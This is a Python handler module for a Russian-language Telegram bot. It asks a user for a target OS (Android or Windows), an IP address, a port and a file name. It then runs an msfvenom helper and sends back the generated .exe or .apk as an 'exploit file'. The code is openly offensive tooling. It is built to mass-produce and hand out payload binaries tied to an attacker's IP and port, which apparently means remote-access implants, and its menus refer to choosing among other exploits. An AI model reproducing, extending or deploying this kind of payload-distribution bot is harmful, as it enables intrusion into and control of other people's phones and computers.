import logging
import os

from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Text

from keyboards.default import start_markup, back_menu_markup
from keyboards.default.scripts.msfvenom import choose_system_markup
from loader import dp
from states import MsfvenomState
from utils.misc import rate_limit
from utils.scripts.msfvenom.start_msfvenom import start_msfvenom


@rate_limit(5, key='MSFvenom')
@dp.message_handler(Text(equals=["MSFvenom"]))
async def dos_menu(message: types.Message):
    await message.answer("Вы попали в MSFvenom меню.\n"
                         "Выберите операционную систему.", reply_markup=choose_system_markup)
    await MsfvenomState.system.set()


@dp.message_handler(state=MsfvenomState.system)
async def enter_system(message: types.Message, state: FSMContext):
    if message.text == 'Отмена':
        await state.reset_state()
        await message.answer("Вы отменили ввод операционной системы. Возврат в главное меню.\n"
                             "Выберите эксплойт.", reply_markup=start_markup)
        return
    elif message.text not in ['Android', 'Windows']:
        await state.reset_state()
        await message.answer("Вы неверно ввели операционную систему. Возврат в главное меню.\n"
                             "Выберите эксплойт.", reply_markup=start_markup)
        return
    async with state.proxy() as data:
        data['system'] = message.text.lower()
    await message.answer("Введите IP-адрес.", reply_markup=back_menu_markup)
    await MsfvenomState.ip.set()


@dp.message_handler(state=MsfvenomState.ip)
async def enter_ip(message: types.Message, state: FSMContext):
    if message.text == 'Отмена':
        await state.reset_state()
        await message.answer("Вы отменили ввод IP-адреса. Возврат в главное меню.\n"
                             "Выберите эксплойт.", reply_markup=start_markup)
        return
    async with state.proxy() as data:
        data['ip'] = message.text
    await message.answer("Введите порт.\n")
    await MsfvenomState.port.set()


@dp.message_handler(state=MsfvenomState.port)
async def enter_port(message: types.Message, state: FSMContext):
    if message.text == 'Отмена':
        await state.reset_state()
        await message.answer("Вы отменили ввод размера данных. Возврат в главное меню.\n"
                             "Выберите эксплойт.", reply_markup=start_markup)
        return
    async with state.proxy() as data:
        data['port'] = message.text
    await message.answer("Введите имя файла.\n")
    await MsfvenomState.file_name.set()


@dp.message_handler(state=MsfvenomState.file_name)
async def enter_file_name(message: types.Message, state: FSMContext):
    if message.text == 'Отмена':
        await state.reset_state()
        await message.answer("Вы отменили ввод имени файла. Возврат в главное меню.\n"
                             "Выберите эксплойт.", reply_markup=start_markup)
        return
    async with state.proxy() as data:
        data['file_name'] = message.text
    try:
        await message.answer('Скрипт выполняется...')
        file_path = await start_msfvenom(message.from_user.id, data)
        file_path += '.exe' if data['system'] == 'windows' else '.apk'
        if os.path.isfile(file_path):
            with open(file_path, 'rb') as file:
                await message.answer_document(file)
            os.remove(file_path)
    except:
        logging.info('Ошибка работы с файлом.')
        await message.answer("Скрипт выполнился с ошибкой. Возврат в главное меню.\n"
                             "Выберите эксплойт.", reply_markup=start_markup)
    else:
        await message.answer("Скрипт успешно выполнен. Файл эксплойта успешно прикреплён в сообщении выше.\n"
                             "Возврат в главное меню. Выберите эксплойт.", reply_markup=start_markup)
    await state.reset_state()
